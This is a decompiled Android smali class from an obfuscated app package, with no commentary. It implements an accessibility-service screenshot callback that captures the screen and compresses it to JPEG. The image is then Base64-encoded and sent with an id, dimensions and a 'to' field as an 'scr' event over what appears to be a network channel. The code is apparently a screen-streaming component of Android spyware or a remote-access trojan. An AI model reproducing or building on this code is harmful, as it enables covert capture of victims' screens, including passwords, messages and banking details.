.class public final Ls0/b;
.super Ljava/lang/Object;
.source "r8-map-id-7d7ae25efe95319b69974e8de8fecbf659b28a04fb22faa5664366b60d5b8370"

# interfaces
.implements Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;


# instance fields
.field public final synthetic a:Lcgn/cdfbgd/a;


# direct methods
.method public native constructor <init>(Lcgn/cdfbgd/a;)V
.end method


# virtual methods
.method public final onFailure(I)V
    .locals 0

    .line 1
    return-void
.end method

.method public final onSuccess(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)V
    .locals 3

    .line 1
    invoke-static {p1}, La0/j1;->b(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)Landroid/hardware/HardwareBuffer;

    .line 2
    .line 3
    .line 4
    move-result-object v0

    .line 5
    invoke-static {p1}, La0/j1;->a(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)Landroid/graphics/ColorSpace;

    .line 6
    .line 7
    .line 8
    move-result-object p1

    .line 9
    invoke-static {v0, p1}, La0/b1;->b(Landroid/hardware/HardwareBuffer;Landroid/graphics/ColorSpace;)Landroid/graphics/Bitmap;

    .line 10
    .line 11
    .line 12
    move-result-object p1

    .line 13
    new-instance v0, Ljava/io/ByteArrayOutputStream;

    .line 14
    .line 15
    invoke-direct {v0}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 16
    .line 17
    .line 18
    sget-object v1, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    .line 19
    .line 20
    const/16 v2, 0x32

    .line 21
    .line 22
    invoke-virtual {p1, v1, v2, v0}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 23
    .line 24
    .line 25
    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    .line 26
    .line 27
    .line 28
    move-result-object p1

    .line 29
    const/4 v0, 0x0

    .line 30
    invoke-static {p1, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    .line 31
    .line 32
    .line 33
    move-result-object p1

    .line 34
    :try_start_0
    new-instance v0, Le2/c;

    .line 35
    .line 36
    invoke-direct {v0}, Le2/c;-><init>()V

    .line 37
    .line 38
    .line 39
    const-string v1, "id"

    .line 40
    .line 41
    sget-object v2, Lcgn/cdfbgd/airbnb;->c:Ljava/lang/String;

    .line 42
    .line 43
    invoke-virtual {v0, v1, v2}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 44
    .line 45
    .line 46
    const-string v1, "zh"

    .line 47
    .line 48
    invoke-static {p1}, La0/n;->j(Ljava/lang/String;)Ljava/lang/String;

    .line 49
    .line 50
    .line 51
    move-result-object p1

    .line 52
    invoke-virtual {v0, v1, p1}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 53
    .line 54
    .line 55
    const-string p1, "h"

    .line 56
    .line 57
    iget-object v1, p0, Ls0/b;->a:Lcgn/cdfbgd/a;

    .line 58
    .line 59
    iget v1, v1, Lcgn/cdfbgd/a;->a:I

    .line 60
    .line 61
    invoke-virtual {v0, v1, p1}, Le2/c;->f(ILjava/lang/String;)V

    .line 62
    .line 63
    .line 64
    const-string p1, "w"

    .line 65
    .line 66
    iget-object v1, p0, Ls0/b;->a:Lcgn/cdfbgd/a;

    .line 67
    .line 68
    iget v1, v1, Lcgn/cdfbgd/a;->b:I

    .line 69
    .line 70
    invoke-virtual {v0, v1, p1}, Le2/c;->f(ILjava/lang/String;)V

    .line 71
    .line 72
    .line 73
    const-string p1, "to"

    .line 74
    .line 75
    iget-object v1, p0, Ls0/b;->a:Lcgn/cdfbgd/a;

    .line 76
    .line 77
    iget-object v1, v1, Lcgn/cdfbgd/a;->g:Ljava/lang/String;

    .line 78
    .line 79
    invoke-virtual {v0, p1, v1}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 80
    .line 81
    .line 82
    sget-object p1, Lcgn/cdfbgd/airbnb;->d:Lv0/r;

    .line 83
    .line 84
    const-string v1, "scr"

    .line 85
    .line 86
    invoke-virtual {v0}, Le2/c;->toString()Ljava/lang/String;

    .line 87
    .line 88
    .line 89
    move-result-object v0

    .line 90
    filled-new-array {v0}, [Ljava/lang/Object;

    .line 91
    .line 92
    .line 93
    move-result-object v0

    .line 94
    invoke-virtual {p1, v1, v0}, Lv0/r;->a(Ljava/lang/String;[Ljava/lang/Object;)Lk0/b;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 95
    .line 96
    .line 97
    return-void

    .line 98
    :catch_0
    move-exception p1

    .line 99
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    .line 100
    .line 101
    .line 102
    return-void
.end method
